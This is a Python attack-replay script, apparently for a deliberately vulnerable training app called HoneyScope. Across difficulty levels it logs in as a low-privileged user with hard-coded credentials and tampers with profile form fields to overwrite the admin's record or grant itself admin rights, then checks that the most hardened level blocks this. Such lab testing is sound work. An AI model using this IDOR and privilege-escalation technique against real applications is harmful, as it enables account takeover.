#!/usr/bin/env python3
"""Replay the idor-profile scenario against a running HoneyScope instance.

Usage: python attack.py http://localhost:5000 [low|medium|high|impossible]
Exit code 0 = exploit succeeded at that level; 1 = not exploitable.
Only run against instances you own. Standard library only.

What this script does (per level):
  low      Log in as mwilson, POST to /profile with user_id=1 (admin) in the
           body — overwrites admin's record and sets role=admin.
  medium   Same POST: form user_id overrides the GET-only ownership check.
  high     Log in as mwilson, POST to own profile with role=admin — self-promotes.
  impossible Log in as mwilson, attempt same POST — role should be unchanged.
"""
import html as htmllib
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


def _build_opener(cookie_jar):
    class _NR(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    class _Cookies(urllib.request.BaseHandler):
        def http_request(self, req):
            if cookie_jar:
                req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookie_jar.items()))
            return req

        def http_response(self, req, resp):
            for header in resp.headers.get_all("Set-Cookie") or []:
                name, _, rest = header.partition("=")
                value, _, _ = rest.partition(";")
                cookie_jar[name.strip()] = value.strip()
            return resp

        https_request = http_request
        https_response = http_response

    return urllib.request.build_opener(_NR, _Cookies)


def _do_login(opener, base, username, password):
    data = urllib.parse.urlencode(
        {"username": username, "password": password}
    ).encode()
    try:
        opener.open(urllib.request.Request(base + "/login", data))
    except urllib.error.HTTPError:
        pass


def _get_own_id(opener, base):
    """Return the logged-in user's ID by reading /profile (default view)."""
    try:
        resp = opener.open(urllib.request.Request(base + "/profile"))
        html = htmllib.unescape(resp.read().decode("utf-8", errors="replace"))
        import re
        m = re.search(r"Profile ID:\s*(\d+)", html)
        return int(m.group(1)) if m else None
    except Exception:
        return None


def attack(base_url: str, level: str) -> bool:
    base = base_url.rstrip("/")
    cookies = {}
    opener = _build_opener(cookies)

    # Log in as mwilson (credentials unaffected by SQLi high filter)
    _do_login(opener, base, "mwilson", "letmein")
    own_id = _get_own_id(opener, base)
    if own_id is None:
        print("  could not determine own user ID", file=sys.stderr)
        return False

    if level in ("low", "medium"):
        # Try to overwrite admin's record (user_id=1) via form body
        data = urllib.parse.urlencode({
            "user_id": "1",
            "username": "mwilson-pwned",
            "email": "mike@evil.com",
            "role": "admin",
        }).encode()
        try:
            resp = opener.open(
                urllib.request.Request(f"{base}/profile?user_id={own_id}", data)
            )
            html = htmllib.unescape(resp.read().decode("utf-8", errors="replace"))
            return "Profile updated" in html or "pwned" in html
        except urllib.error.HTTPError as e:
            return e.code not in (403, 404)

    if level == "high":
        # Self-promote by setting role=admin on own profile
        data = urllib.parse.urlencode({
            "user_id": str(own_id),
            "username": "mwilson",
            "email": "mike.wilson@techcorp-internal.com",
            "role": "admin",
        }).encode()
        try:
            resp = opener.open(
                urllib.request.Request(f"{base}/profile?user_id={own_id}", data)
            )
            html = htmllib.unescape(resp.read().decode("utf-8", errors="replace"))
            # Success if badge-admin appears (role was updated)
            return "badge-admin" in html or "Profile updated" in html
        except urllib.error.HTTPError as e:
            return False

    # impossible: attempt self-promotion; role should stay unchanged
    data = urllib.parse.urlencode({
        "user_id": str(own_id),
        "username": "mwilson",
        "email": "mike.wilson@techcorp-internal.com",
        "role": "admin",
    }).encode()
    try:
        resp = opener.open(
            urllib.request.Request(f"{base}/profile?user_id={own_id}", data)
        )
        html = htmllib.unescape(resp.read().decode("utf-8", errors="replace"))
        # At impossible the role should remain manager, not admin
        import re as re_
        # Check the badge that's displayed
        return "badge-admin" not in html
    except urllib.error.HTTPError:
        return False


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    ok = attack(url, lvl)
    if lvl == "impossible":
        print(f"[{lvl}] IDOR/privilege escalation {'correctly blocked' if ok else 'NOT blocked (unexpected)'}")
    else:
        print(f"[{lvl}] exploit {'SUCCEEDED' if ok else 'failed'}")
    sys.exit(0 if ok else 1)
